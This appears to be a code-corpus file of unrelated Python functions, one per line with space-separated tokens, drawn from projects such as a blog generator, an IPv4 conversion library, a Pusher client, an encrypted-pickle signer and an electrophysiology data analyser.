def git_tag ( tag ) : print ( 'Tagging "{}"' . format ( tag ) ) msg = '"Released version {}"' . format ( tag ) Popen ( [ 'git' , 'tag' , '-s' , '-m' , msg , tag ] ) . wait ( )
def render_to ( self , path , template , * * data ) : html = self . render ( template , * * data ) with open ( path , 'w' ) as f : f . write ( html . encode ( charset ) )
def index_row ( self , dataframe ) : return dataframe . loc [ self . kwargs [ self . lookup_url_kwarg ] ] . to_frame ( ) . T
def paginator ( self ) : if not hasattr ( self , '_paginator' ) : if self . pagination_class is None : self . _paginator = None else : self . _paginator = self . pagination_class ( ) return self . _paginator
def paginate_dataframe ( self , dataframe ) : if self . paginator is None : return None return self . paginator . paginate_dataframe ( dataframe , self . request , view = self )
def parse ( self ) : if exists ( self . filepath ) : content = open ( self . filepath ) . read ( ) . decode ( charset ) else : content = "" try : config = toml . loads ( content ) except toml . TomlSyntaxError : raise ConfigSyntaxError return config
def parse ( self , source ) : rt , title , title_pic , markdown = libparser . parse ( source ) if rt == - 1 : raise SeparatorNotFound elif rt == - 2 : raise PostTitleNotFound # change to unicode title , title_pic , markdown = map ( to_unicode , ( title , title_pic , markdown ) ) # render to html html = self . markdown . render ( markdown ) summary = self . markdown . render ( markdown [ : 200 ] ) return { 'title' : title , 'markdown' : markdown , 'html' : html , 'summary' : summary , 'title_pic' : title_pic }
def parse_filename ( self , filepath ) : name = os . path . basename ( filepath ) [ : - src_ext_len ] try : dt = datetime . strptime ( name , "%Y-%m-%d-%H-%M" ) except ValueError : raise PostNameInvalid return { 'name' : name , 'datetime' : dt , 'filepath' : filepath }
def run_server ( self , port ) : try : self . server = MultiThreadedHTTPServer ( ( '0.0.0.0' , port ) , Handler ) except socket . error , e : # failed to bind port logger . error ( str ( e ) ) sys . exit ( 1 ) logger . info ( "HTTP serve at http://0.0.0.0:%d (ctrl-c to stop) ..." % port ) try : self . server . serve_forever ( ) except KeyboardInterrupt : logger . info ( "^C received, shutting down server" ) self . shutdown_server ( )
def get_files_stat ( self ) : if not exists ( Post . src_dir ) : logger . error ( SourceDirectoryNotFound . __doc__ ) sys . exit ( SourceDirectoryNotFound . exit_code ) paths = [ ] for fn in ls ( Post . src_dir ) : if fn . endswith ( src_ext ) : paths . append ( join ( Post . src_dir , fn ) ) # config.toml if exists ( config . filepath ) : paths . append ( config . filepath ) # files: a <filepath to updated time> dict files = dict ( ( p , stat ( p ) . st_mtime ) for p in paths ) return files
def deploy_blog ( ) : logger . info ( deploy_blog . __doc__ ) # `rsync -aqu path/to/res/* .` call ( 'rsync -aqu ' + join ( dirname ( __file__ ) , 'res' , '*' ) + ' .' , shell = True ) logger . success ( 'Done' ) logger . info ( 'Please edit config.toml to meet your needs' )
def using ( context , alias ) : # An empty alias means look in the current widget set. if alias == '' : yield context else : try : widgets = context . render_context [ WIDGET_CONTEXT_KEY ] except KeyError : raise template . TemplateSyntaxError ( 'No widget libraries loaded!' ) try : block_set = widgets [ alias ] except KeyError : raise template . TemplateSyntaxError ( 'No widget library loaded for alias: %r' % alias ) context . render_context . push ( ) context . render_context [ BLOCK_CONTEXT_KEY ] = block_set context . render_context [ WIDGET_CONTEXT_KEY ] = widgets yield context context . render_context . pop ( )
def find_block ( context , * names ) : block_set = context . render_context [ BLOCK_CONTEXT_KEY ] for name in names : block = block_set . get_block ( name ) if block is not None : return block raise template . TemplateSyntaxError ( 'No widget found for: %r' % ( names , ) )
def load_widgets ( context , * * kwargs ) : _soft = kwargs . pop ( '_soft' , False ) try : widgets = context . render_context [ WIDGET_CONTEXT_KEY ] except KeyError : widgets = context . render_context [ WIDGET_CONTEXT_KEY ] = { } for alias , template_name in kwargs . items ( ) : if _soft and alias in widgets : continue with context . render_context . push ( { BLOCK_CONTEXT_KEY : BlockContext ( ) } ) : blocks = resolve_blocks ( template_name , context ) widgets [ alias ] = blocks return ''
def auto_widget ( field ) : # Auto-detect info = { 'widget' : field . field . widget . __class__ . __name__ , 'field' : field . field . __class__ . __name__ , 'name' : field . name , } return [ fmt . format ( * * info ) for fmt in ( '{field}_{widget}_{name}' , '{field}_{name}' , '{widget}_{name}' , '{field}_{widget}' , '{name}' , '{widget}' , '{field}' , ) ]
def display ( self ) : if not self . is_group ( ) : return self . _display return ( ( force_text ( k ) , v ) for k , v in self . _display )
def stored_messages_list ( context , num_elements = 10 ) : if "user" in context : user = context [ "user" ] if user . is_authenticated ( ) : qs = Inbox . objects . select_related ( "message" ) . filter ( user = user ) return { "messages" : qs [ : num_elements ] , "count" : qs . count ( ) , }
def stored_messages_count ( context ) : if "user" in context : user = context [ "user" ] if user . is_authenticated ( ) : return Inbox . objects . select_related ( "message" ) . filter ( user = user ) . count ( )
def stored_messages_archive ( context , num_elements = 10 ) : if "user" in context : user = context [ "user" ] if user . is_authenticated ( ) : qs = MessageArchive . objects . select_related ( "message" ) . filter ( user = user ) return { "messages" : qs [ : num_elements ] , "count" : qs . count ( ) , }
def jocker ( test_options = None ) : version = ver_check ( ) options = test_options or docopt ( __doc__ , version = version ) _set_global_verbosity_level ( options . get ( '--verbose' ) ) jocker_lgr . debug ( options ) jocker_run ( options )
def configure_custom ( self , config ) : c = config . pop ( '()' ) if not hasattr ( c , '__call__' ) and hasattr ( types , 'ClassType' ) and isinstance ( c , types . ClassType ) : c = self . resolve ( c ) props = config . pop ( '.' , None ) # Check for valid identifiers kwargs = dict ( ( k , config [ k ] ) for k in config if valid_ident ( k ) ) result = c ( * * kwargs ) if props : for name , value in props . items ( ) : setattr ( result , name , value ) return result
def upload_gif ( gif ) : client_id = os . environ . get ( 'IMGUR_API_ID' ) client_secret = os . environ . get ( 'IMGUR_API_SECRET' ) if client_id is None or client_secret is None : click . echo ( 'Cannot upload - could not find IMGUR_API_ID or IMGUR_API_SECRET environment variables' ) return client = ImgurClient ( client_id , client_secret ) click . echo ( 'Uploading file {}' . format ( click . format_filename ( gif ) ) ) response = client . upload_from_path ( gif ) click . echo ( 'File uploaded - see your gif at {}' . format ( response [ 'link' ] ) )
def is_dot ( ip ) : octets = str ( ip ) . split ( '.' ) if len ( octets ) != 4 : return False for i in octets : try : val = int ( i ) except ValueError : return False if val > 255 or val < 0 : return False return True
def is_bin ( ip ) : try : ip = str ( ip ) if len ( ip ) != 32 : return False dec = int ( ip , 2 ) except ( TypeError , ValueError ) : return False if dec > 4294967295 or dec < 0 : return False return True
def is_oct ( ip ) : try : dec = int ( str ( ip ) , 8 ) except ( TypeError , ValueError ) : return False if dec > 0o37777777777 or dec < 0 : return False return True
def is_dec ( ip ) : try : dec = int ( str ( ip ) ) except ValueError : return False if dec > 4294967295 or dec < 0 : return False return True
def is_bits_nm ( nm ) : try : bits = int ( str ( nm ) ) except ValueError : return False if bits > 32 or bits < 0 : return False return True
def is_wildcard_nm ( nm ) : try : dec = 0xFFFFFFFF - _dot_to_dec ( nm , check = True ) except ValueError : return False if dec in _NETMASKS_VALUES : return True return False
def _dot_to_dec ( ip , check = True ) : if check and not is_dot ( ip ) : raise ValueError ( '_dot_to_dec: invalid IP: "%s"' % ip ) octets = str ( ip ) . split ( '.' ) dec = 0 dec |= int ( octets [ 0 ] ) << 24 dec |= int ( octets [ 1 ] ) << 16 dec |= int ( octets [ 2 ] ) << 8 dec |= int ( octets [ 3 ] ) return dec
def _dec_to_dot ( ip ) : first = int ( ( ip >> 24 ) & 255 ) second = int ( ( ip >> 16 ) & 255 ) third = int ( ( ip >> 8 ) & 255 ) fourth = int ( ip & 255 ) return '%d.%d.%d.%d' % ( first , second , third , fourth )
def _hex_to_dec ( ip , check = True ) : if check and not is_hex ( ip ) : raise ValueError ( '_hex_to_dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = hex ( ip ) return int ( str ( ip ) , 16 )
def _oct_to_dec ( ip , check = True ) : if check and not is_oct ( ip ) : raise ValueError ( '_oct_to_dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = oct ( ip ) return int ( str ( ip ) , 8 )
def _bin_to_dec ( ip , check = True ) : if check and not is_bin ( ip ) : raise ValueError ( '_bin_to_dec: invalid IP: "%s"' % ip ) if isinstance ( ip , int ) : ip = str ( ip ) return int ( str ( ip ) , 2 )
def _dec_to_bin ( ip ) : bits = [ ] while ip : bits . append ( _BYTES_TO_BITS [ ip & 255 ] ) ip >>= 8 bits . reverse ( ) return '' . join ( bits ) or 32 * '0'
def _bits_to_dec ( nm , check = True ) : if check and not is_bits_nm ( nm ) : raise ValueError ( '_bits_to_dec: invalid netmask: "%s"' % nm ) bits = int ( str ( nm ) ) return VALID_NETMASKS [ bits ]
def _wildcard_to_dec ( nm , check = False ) : if check and not is_wildcard_nm ( nm ) : raise ValueError ( '_wildcard_to_dec: invalid netmask: "%s"' % nm ) return 0xFFFFFFFF - _dot_to_dec ( nm , check = False )
def _convert ( ip , notation , inotation , _check , _isnm ) : inotation_orig = inotation notation_orig = notation inotation = _get_notation ( inotation ) notation = _get_notation ( notation ) if inotation is None : raise ValueError ( '_convert: unknown input notation: "%s"' % inotation_orig ) if notation is None : raise ValueError ( '_convert: unknown output notation: "%s"' % notation_orig ) docheck = _check or False if inotation == IP_UNKNOWN : inotation = _detect ( ip , _isnm ) if inotation == IP_UNKNOWN : raise ValueError ( '_convert: unable to guess input notation or invalid value' ) if _check is None : docheck = True # We _always_ check this case later. if _isnm : docheck = False dec = 0 if inotation == IP_DOT : dec = _dot_to_dec ( ip , docheck ) elif inotation == IP_HEX : dec = _hex_to_dec ( ip , docheck ) elif inotation == IP_BIN : dec = _bin_to_dec ( ip , docheck ) elif inotation == IP_OCT : dec = _oct_to_dec ( ip , docheck ) elif inotation == IP_DEC : dec = _dec_to_dec_long ( ip , docheck ) elif _isnm and inotation == NM_BITS : dec = _bits_to_dec ( ip , docheck ) elif _isnm and inotation == NM_WILDCARD : dec = _wildcard_to_dec ( ip , docheck ) else : raise ValueError ( '_convert: unknown IP/netmask notation: "%s"' % inotation_orig ) # Ensure this is a valid netmask. if _isnm and dec not in _NETMASKS_VALUES : raise ValueError ( '_convert: invalid netmask: "%s"' % ip ) if notation == IP_DOT : return _dec_to_dot ( dec ) elif notation == IP_HEX : return _dec_to_hex ( dec ) elif notation == IP_BIN : return _dec_to_bin ( dec ) elif notation == IP_OCT : return _dec_to_oct ( dec ) elif notation == IP_DEC : return _dec_to_dec_str ( dec ) elif _isnm and notation == NM_BITS : return _dec_to_bits ( dec ) elif _isnm and notation == NM_WILDCARD : return _dec_to_wildcard ( dec ) else : raise ValueError ( 'convert: unknown notation: "%s"' % notation_orig )
def convert_nm ( nm , notation = IP_DOT , inotation = IP_UNKNOWN , check = True ) : return _convert ( nm , notation , inotation , _check = check , _isnm = True )
def _add ( self , other ) : if isinstance ( other , self . __class__ ) : sum_ = self . _ip_dec + other . _ip_dec elif isinstance ( other , int ) : sum_ = self . _ip_dec + other else : other = self . __class__ ( other ) sum_ = self . _ip_dec + other . _ip_dec return sum_
def _sub ( self , other ) : if isinstance ( other , self . __class__ ) : sub = self . _ip_dec - other . _ip_dec if isinstance ( other , int ) : sub = self . _ip_dec - other else : other = self . __class__ ( other ) sub = self . _ip_dec - other . _ip_dec return sub
def get_bits ( self ) : return _convert ( self . _ip , notation = NM_BITS , inotation = IP_DOT , _check = False , _isnm = self . _isnm )
def get_wildcard ( self ) : return _convert ( self . _ip , notation = NM_WILDCARD , inotation = IP_DOT , _check = False , _isnm = self . _isnm )
def set ( self , ip , netmask = None ) : if isinstance ( ip , str ) and netmask is None : ipnm = ip . split ( '/' ) if len ( ipnm ) != 2 : raise ValueError ( 'set: invalid CIDR: "%s"' % ip ) ip = ipnm [ 0 ] netmask = ipnm [ 1 ] if isinstance ( ip , IPv4Address ) : self . _ip = ip else : self . _ip = IPv4Address ( ip ) if isinstance ( netmask , IPv4NetMask ) : self . _nm = netmask else : self . _nm = IPv4NetMask ( netmask ) ipl = int ( self . _ip ) nml = int ( self . _nm ) base_add = ipl & nml self . _ip_num = 0xFFFFFFFF - 1 - nml # NOTE: quite a mess. #      This's here to handle /32 (-1) and /31 (0) netmasks. if self . _ip_num in ( - 1 , 0 ) : if self . _ip_num == - 1 : self . _ip_num = 1 else : self . _ip_num = 2 self . _net_ip = None self . _bc_ip = None self . _first_ip_dec = base_add self . _first_ip = IPv4Address ( self . _first_ip_dec , notation = IP_DEC ) if self . _ip_num == 1 : last_ip_dec = self . _first_ip_dec else : last_ip_dec = self . _first_ip_dec + 1 self . _last_ip = IPv4Address ( last_ip_dec , notation = IP_DEC ) return self . _net_ip = IPv4Address ( base_add , notation = IP_DEC ) self . _bc_ip = IPv4Address ( base_add + self . _ip_num + 1 , notation = IP_DEC ) self . _first_ip_dec = base_add + 1 self . _first_ip = IPv4Address ( self . _first_ip_dec , notation = IP_DEC ) self . _last_ip = IPv4Address ( base_add + self . _ip_num , notation = IP_DEC )
def set_ip ( self , ip ) : self . set ( ip = ip , netmask = self . _nm )
def set_netmask ( self , netmask ) : self . set ( ip = self . _ip , netmask = netmask )
async def copy_storage_object ( self , source_bucket , source_key , bucket , key ) : info = await self . head_object ( Bucket = source_bucket , Key = source_key ) size = info [ 'ContentLength' ] if size > MULTI_PART_SIZE : result = await _multipart_copy ( self , source_bucket , source_key , bucket , key , size ) else : result = await self . copy_object ( Bucket = bucket , Key = key , CopySource = _source_string ( source_bucket , source_key ) ) return result
async def _upload_file ( self , full_path ) : rel_path = os . path . relpath ( full_path , self . folder ) key = s3_key ( os . path . join ( self . key , rel_path ) ) ct = self . content_types . get ( key . split ( '.' ) [ - 1 ] ) with open ( full_path , 'rb' ) as fp : file = fp . read ( ) try : await self . botocore . upload_file ( self . bucket , file , key = key , ContentType = ct ) except Exception as exc : LOGGER . error ( 'Could not upload "%s": %s' , key , exc ) self . failures [ key ] = self . all . pop ( full_path ) return size = self . all . pop ( full_path ) self . success [ key ] = size self . total_size += size percentage = 100 * ( 1 - len ( self . all ) / self . total_files ) message = '{0:.0f}% completed - uploaded "{1}" - {2}' . format ( percentage , key , convert_bytes ( size ) ) LOGGER . info ( message )
async def trigger ( self , event , data = None , socket_id = None ) : json_data = json . dumps ( data , cls = self . pusher . encoder ) query_string = self . signed_query ( event , json_data , socket_id ) signed_path = "%s?%s" % ( self . path , query_string ) pusher = self . pusher absolute_url = pusher . get_absolute_path ( signed_path ) response = await pusher . http . post ( absolute_url , data = json_data , headers = [ ( 'Content-Type' , 'application/json' ) ] ) response . raise_for_status ( ) return response . status_code == 202
async def connect ( self ) : if not self . _consumer : waiter = self . _waiter = asyncio . Future ( ) try : address = self . _websocket_host ( ) self . logger . info ( 'Connect to %s' , address ) self . _consumer = await self . http . get ( address ) if self . _consumer . status_code != 101 : raise PusherError ( "Could not connect to websocket" ) except Exception as exc : waiter . set_exception ( exc ) raise else : await waiter return self . _consumer
def on_message ( self , websocket , message ) : waiter = self . _waiter self . _waiter = None encoded = json . loads ( message ) event = encoded . get ( 'event' ) channel = encoded . get ( 'channel' ) data = json . loads ( encoded . get ( 'data' ) ) try : if event == PUSHER_ERROR : raise PusherError ( data [ 'message' ] , data [ 'code' ] ) elif event == PUSHER_CONNECTION : self . socket_id = data . get ( 'socket_id' ) self . logger . info ( 'Succesfully connected on socket %s' , self . socket_id ) waiter . set_result ( self . socket_id ) elif event == PUSHER_SUBSCRIBED : self . logger . info ( 'Succesfully subscribed to %s' , encoded . get ( 'channel' ) ) elif channel : self [ channel ] . _event ( event , data ) except Exception as exc : if waiter : waiter . set_exception ( exc ) else : self . logger . exception ( 'pusher error' )
def const_equal ( str_a , str_b ) : if len ( str_a ) != len ( str_b ) : return False result = True for i in range ( len ( str_a ) ) : result &= ( str_a [ i ] == str_b [ i ] ) return result
def decode_html_entities ( html ) : if not html : return html for entity , char in six . iteritems ( html_entity_map ) : html = html . replace ( entity , char ) return html
def set_algorithms ( self , signature = None , encryption = None , serialization = None , compression = None ) : self . signature_algorithms = self . _update_dict ( signature , self . DEFAULT_SIGNATURE ) self . encryption_algorithms = self . _update_dict ( encryption , self . DEFAULT_ENCRYPTION ) self . serialization_algorithms = self . _update_dict ( serialization , self . DEFAULT_SERIALIZATION ) self . compression_algorithms = self . _update_dict ( compression , self . DEFAULT_COMPRESSION )
def get_algorithms ( self ) : return { 'signature' : self . signature_algorithms , 'encryption' : self . encryption_algorithms , 'serialization' : self . serialization_algorithms , 'compression' : self . compression_algorithms , }
def _set_options ( self , options ) : if not options : return self . options . copy ( ) options = options . copy ( ) if 'magic' in options : self . set_magic ( options [ 'magic' ] ) del ( options [ 'magic' ] ) if 'flags' in options : flags = options [ 'flags' ] del ( options [ 'flags' ] ) for key , value in flags . iteritems ( ) : if not isinstance ( value , bool ) : raise TypeError ( 'Invalid flag type for: %s' % key ) else : flags = self . options [ 'flags' ] if 'info' in options : del ( options [ 'info' ] ) for key , value in options . iteritems ( ) : if not isinstance ( value , int ) : raise TypeError ( 'Invalid option type for: %s' % key ) if value < 0 or value > 255 : raise ValueError ( 'Option value out of range for: %s' % key ) new_options = self . options . copy ( ) new_options . update ( options ) new_options [ 'flags' ] . update ( flags ) return new_options
def verify_signature ( self , data ) : data = self . _remove_magic ( data ) data = urlsafe_nopadding_b64decode ( data ) options = self . _read_header ( data ) data = self . _add_magic ( data ) self . _unsign_data ( data , options )
def _encode ( self , data , algorithm , key = None ) : if algorithm [ 'type' ] == 'hmac' : return data + self . _hmac_generate ( data , algorithm , key ) elif algorithm [ 'type' ] == 'aes' : return self . _aes_encrypt ( data , algorithm , key ) elif algorithm [ 'type' ] == 'no-serialization' : return data elif algorithm [ 'type' ] == 'json' : return json . dumps ( data ) elif algorithm [ 'type' ] == 'no-compression' : return data elif algorithm [ 'type' ] == 'gzip' : return self . _zlib_compress ( data , algorithm ) else : raise Exception ( 'Algorithm not supported: %s' % algorithm [ 'type' ] )
def _decode ( self , data , algorithm , key = None ) : if algorithm [ 'type' ] == 'hmac' : verify_signature = data [ - algorithm [ 'hash_size' ] : ] data = data [ : - algorithm [ 'hash_size' ] ] signature = self . _hmac_generate ( data , algorithm , key ) if not const_equal ( verify_signature , signature ) : raise Exception ( 'Invalid signature' ) return data elif algorithm [ 'type' ] == 'aes' : return self . _aes_decrypt ( data , algorithm , key ) elif algorithm [ 'type' ] == 'no-serialization' : return data elif algorithm [ 'type' ] == 'json' : return json . loads ( data ) elif algorithm [ 'type' ] == 'no-compression' : return data elif algorithm [ 'type' ] == 'gzip' : return self . _zlib_decompress ( data , algorithm ) else : raise Exception ( 'Algorithm not supported: %s' % algorithm [ 'type' ] )
def _sign_data ( self , data , options ) : if options [ 'signature_algorithm_id' ] not in self . signature_algorithms : raise Exception ( 'Unknown signature algorithm id: %d' % options [ 'signature_algorithm_id' ] ) signature_algorithm = self . signature_algorithms [ options [ 'signature_algorithm_id' ] ] algorithm = self . _get_algorithm_info ( signature_algorithm ) key_salt = get_random_bytes ( algorithm [ 'salt_size' ] ) key = self . _generate_key ( options [ 'signature_passphrase_id' ] , self . signature_passphrases , key_salt , algorithm ) data = self . _encode ( data , algorithm , key ) return data + key_salt
def _unsign_data ( self , data , options ) : if options [ 'signature_algorithm_id' ] not in self . signature_algorithms : raise Exception ( 'Unknown signature algorithm id: %d' % options [ 'signature_algorithm_id' ] ) signature_algorithm = self . signature_algorithms [ options [ 'signature_algorithm_id' ] ] algorithm = self . _get_algorithm_info ( signature_algorithm ) key_salt = '' if algorithm [ 'salt_size' ] : key_salt = data [ - algorithm [ 'salt_size' ] : ] data = data [ : - algorithm [ 'salt_size' ] ] key = self . _generate_key ( options [ 'signature_passphrase_id' ] , self . signature_passphrases , key_salt , algorithm ) data = self . _decode ( data , algorithm , key ) return data
def _remove_magic ( self , data ) : if not self . magic : return data magic_size = len ( self . magic ) magic = data [ : magic_size ] if magic != self . magic : raise Exception ( 'Invalid magic' ) data = data [ magic_size : ] return data
def _add_header ( self , data , options ) : # pylint: disable=W0142 version_info = self . _get_version_info ( options [ 'version' ] ) flags = options [ 'flags' ] header_flags = dict ( ( i , str ( int ( j ) ) ) for i , j in options [ 'flags' ] . iteritems ( ) ) header_flags = '' . join ( version_info [ 'flags' ] ( * * header_flags ) ) header_flags = int ( header_flags , 2 ) options [ 'flags' ] = header_flags header = version_info [ 'header' ] header = header ( * * options ) header = pack ( version_info [ 'header_format' ] , * header ) if 'timestamp' in flags and flags [ 'timestamp' ] : timestamp = long ( time ( ) ) timestamp = pack ( version_info [ 'timestamp_format' ] , timestamp ) header = header + timestamp return header + data
def _read_header ( self , data ) : # pylint: disable=W0212 version = self . _read_version ( data ) version_info = self . _get_version_info ( version ) header_data = data [ : version_info [ 'header_size' ] ] header = version_info [ 'header' ] header = header . _make ( unpack ( version_info [ 'header_format' ] , header_data ) ) header = dict ( header . _asdict ( ) ) flags = list ( "{0:0>8b}" . format ( header [ 'flags' ] ) ) flags = dict ( version_info [ 'flags' ] . _make ( flags ) . _asdict ( ) ) flags = dict ( ( i , bool ( int ( j ) ) ) for i , j in flags . iteritems ( ) ) header [ 'flags' ] = flags timestamp = None if flags [ 'timestamp' ] : ts_start = version_info [ 'header_size' ] ts_end = ts_start + version_info [ 'timestamp_size' ] timestamp_data = data [ ts_start : ts_end ] timestamp = unpack ( version_info [ 'timestamp_format' ] , timestamp_data ) [ 0 ] header [ 'info' ] = { 'timestamp' : timestamp } return header
def _remove_header ( self , data , options ) : version_info = self . _get_version_info ( options [ 'version' ] ) header_size = version_info [ 'header_size' ] if options [ 'flags' ] [ 'timestamp' ] : header_size += version_info [ 'timestamp_size' ] data = data [ header_size : ] return data
def _read_version ( self , data ) : version = ord ( data [ 0 ] ) if version not in self . VERSIONS : raise Exception ( 'Version not defined: %d' % version ) return version
def _generate_key ( pass_id , passphrases , salt , algorithm ) : if pass_id not in passphrases : raise Exception ( 'Passphrase not defined for id: %d' % pass_id ) passphrase = passphrases [ pass_id ] if len ( passphrase ) < 32 : raise Exception ( 'Passphrase less than 32 characters long' ) digestmod = EncryptedPickle . _get_hashlib ( algorithm [ 'pbkdf2_algorithm' ] ) encoder = PBKDF2 ( passphrase , salt , iterations = algorithm [ 'pbkdf2_iterations' ] , digestmodule = digestmod ) return encoder . read ( algorithm [ 'key_size' ] )
def _update_dict ( data , default_data , replace_data = False ) : if not data : data = default_data . copy ( ) return data if not isinstance ( data , dict ) : raise TypeError ( 'Value not dict type' ) if len ( data ) > 255 : raise ValueError ( 'More than 255 values defined' ) for i in data . keys ( ) : if not isinstance ( i , int ) : raise TypeError ( 'Index not int type' ) if i < 0 or i > 255 : raise ValueError ( 'Index value out of range' ) if not replace_data : data . update ( default_data ) return data
def _dump_field ( self , fd ) : v = { } v [ 'label' ] = Pbd . LABELS [ fd . label ] v [ 'type' ] = fd . type_name if len ( fd . type_name ) > 0 else Pbd . TYPES [ fd . type ] v [ 'name' ] = fd . name v [ 'number' ] = fd . number v [ 'default' ] = '[default = {}]' . format ( fd . default_value ) if len ( fd . default_value ) > 0 else '' f = '{label} {type} {name} = {number} {default};' . format ( * * v ) f = ' ' . join ( f . split ( ) ) self . _print ( f ) if len ( fd . type_name ) > 0 : self . uses . append ( fd . type_name )
def disassemble ( self ) : ser_pb = open ( self . input_file , 'rb' ) . read ( ) # Read serialized pb file fd = FileDescriptorProto ( ) fd . ParseFromString ( ser_pb ) self . name = fd . name self . _print ( ) self . _print ( 'syntax = "proto2";' ) self . _print ( '' ) if len ( fd . package ) > 0 : self . _print ( 'package {};' . format ( fd . package ) ) self . package = fd . package else : self . _print ( '// Package not defined' ) self . _walk ( fd )
def find_imports ( self , pbds ) : # List of types used, but not defined imports = list ( set ( self . uses ) . difference ( set ( self . defines ) ) ) # Clumpsy, but enought for now  for imp in imports : for p in pbds : if imp in p . defines : self . imports . append ( p . name ) break self . imports = list ( set ( self . imports ) ) for import_file in self . imports : self . lines . insert ( 2 , 'import "{}";' . format ( import_file ) )
def abfIDfromFname ( fname ) : fname = os . path . abspath ( fname ) basename = os . path . basename ( fname ) return os . path . splitext ( basename ) [ 0 ]
def abfProtocol ( fname ) : f = open ( fname , 'rb' ) raw = f . read ( 30 * 1000 ) #it should be in the first 30k of the file f . close ( ) raw = raw . decode ( "utf-8" , "ignore" ) raw = raw . split ( "Clampex" ) [ 1 ] . split ( ".pro" ) [ 0 ] protocol = os . path . basename ( raw ) # the whole protocol filename protocolID = protocol . split ( " " ) [ 0 ] # just the first number return protocolID
def headerHTML ( header , fname ) : html = "<html><body><code>" html += "<h2>%s</h2>" % ( fname ) html += pprint . pformat ( header , indent = 1 ) html = html . replace ( "\n" , '<br>' ) . replace ( " " , "&nbsp;" ) html = html . replace ( r"\x00" , "" ) html += "</code></body></html>" print ( "saving header file:" , fname ) f = open ( fname , 'w' ) f . write ( html ) f . close ( ) webbrowser . open ( fname )
def setsweep ( self , sweep = 0 , channel = 0 ) : try : sweep = int ( sweep ) except : self . log . error ( "trying to set sweep to [%s]" , sweep ) return if sweep < 0 : sweep = self . sweeps - 1 - sweep # if negative, start from the end sweep = max ( 0 , min ( sweep , self . sweeps - 1 ) ) # correct for out of range sweeps if 'sweep' in dir ( self ) and self . sweep == sweep and self . derivative is False : self . log . debug ( "sweep %d already set" , sweep ) return #self.log.debug("loading sweep %d (Ch%d)",sweep,channel) self . channels = self . ABFblock . segments [ sweep ] . size [ "analogsignals" ] if self . channels > 1 and sweep == 0 : self . log . info ( "WARNING: multichannel not yet supported!" ) #TODO: self . trace = self . ABFblock . segments [ sweep ] . analogsignals [ channel ] self . sweep = sweep # currently selected sweep self . channel = channel # currently selected channel # sweep information self . rate = int ( self . trace . sampling_rate ) # Hz self . period = float ( 1 / self . rate ) # seconds (inverse of sample rate) self . pointsPerSec = int ( self . rate ) # for easy access self . pointsPerMs = int ( self . rate / 1000.0 ) # for easy access self . sweepSize = len ( self . trace ) # number of data points per sweep self . sweepInterval = self . trace . duration . magnitude # sweep interval (seconds) self . sweepLength = float ( self . trace . t_stop - self . trace . t_start ) # in seconds self . length = self . sweepLength * self . sweeps # length (sec) of total recording self . lengthMinutes = self . length / 60.0 # length (minutes) of total recording if str ( self . trace . dimensionality ) == 'pA' : self . units , self . units2 = "pA" , "clamp current (pA)" self . unitsD , self . unitsD2 = "pA/ms" , "current velocity (pA/ms)" self . protoUnits , self . protoUnits2 = "mV" , "command voltage (mV)" elif str ( self . trace . dimensionality ) == 'mV' : self . units , self . units2 = "mV" , "membrane potential (mV)" self . unitsD , self . unitsD2 = "V/s" , "potential velocity (V/s)" self . protoUnits , self . protoUnits2 = "pA" , "command current (pA)" else : self . units , self . units2 = "?" , "unknown units" self . unitsD , self . unitsD2 = "?" , "unknown units" # sweep data self . sweepY = self . trace . magnitude # sweep data (mV or pA) self . sweepT = self . trace . times . magnitude # actual sweep times (sec) self . sweepStart = float ( self . trace . t_start ) # time start of sweep (sec) self . sweepX2 = self . sweepT - self . trace . t_start . magnitude # sweeps overlap self . sweepX = self . sweepX2 + sweep * self . sweepInterval # assume no gaps if self . derivative : self . log . debug ( "taking derivative" ) #self.sweepD=np.diff(self.sweepY) # take derivative self . sweepD = self . sweepY [ 1 : ] - self . sweepY [ : - 1 ] # better? self . sweepD = np . insert ( self . sweepD , 0 , self . sweepD [ 0 ] ) # add a point self . sweepD /= ( self . period * 1000 ) # correct for sample rate else : self . sweepD = [ 0 ] # derivative is forced to be empty # generate the protocol too self . generate_protocol ( )
def setsweeps ( self ) : for sweep in range ( self . sweeps ) : self . setsweep ( sweep ) yield self . sweep
def comments_load ( self ) : self . comment_times , self . comment_sweeps , self . comment_tags = [ ] , [ ] , [ ] self . comments = 0 # will be >0 if comments exist self . comment_text = "" try : # this used to work self . comment_tags = list ( self . ABFblock . segments [ 0 ] . eventarrays [ 0 ] . annotations [ 'comments' ] ) self . comment_times = list ( self . ABFblock . segments [ 0 ] . eventarrays [ 0 ] . times / self . trace . itemsize ) self . comment_sweeps = list ( self . comment_times ) except : # now this notation seems to work for events in self . ABFblock . segments [ 0 ] . events : # this should only happen once actually self . comment_tags = events . annotations [ 'comments' ] . tolist ( ) self . comment_times = np . array ( events . times . magnitude / self . trace . itemsize ) self . comment_sweeps = self . comment_times / self . sweepInterval for i , c in enumerate ( self . comment_tags ) : self . comment_tags [ i ] = c . decode ( "utf-8" )
def average ( self , t1 = 0 , t2 = None , setsweep = False ) : if setsweep : self . setsweep ( setsweep ) if t2 is None or t2 > self . sweepLength : t2 = self . sweepLength self . log . debug ( "resetting t2 to [%f]" , t2 ) t1 = max ( t1 , 0 ) if t1 > t2 : self . log . error ( "t1 cannot be larger than t2" ) return False I1 , I2 = int ( t1 * self . pointsPerSec ) , int ( t2 * self . pointsPerSec ) if I1 == I2 : return np . nan return np . average ( self . sweepY [ I1 : I2 ] )
def kernel_gaussian ( self , sizeMS , sigmaMS = None , forwardOnly = False ) : sigmaMS = sizeMS / 10 if sigmaMS is None else sigmaMS size , sigma = sizeMS * self . pointsPerMs , sigmaMS * self . pointsPerMs self . kernel = swhlab . common . kernel_gaussian ( size , sigma , forwardOnly ) return self . kernel
def dictFlat ( l ) : if type ( l ) is dict : return [ l ] if "numpy" in str ( type ( l ) ) : return l dicts = [ ] for item in l : if type ( item ) == dict : dicts . append ( item ) elif type ( item ) == list : for item2 in item : dicts . append ( item2 ) return dicts
def matrixValues ( matrix , key ) : assert key in matrix . dtype . names col = matrix . dtype . names . index ( key ) values = np . empty ( len ( matrix ) ) * np . nan for i in range ( len ( matrix ) ) : values [ i ] = matrix [ i ] [ col ] return values
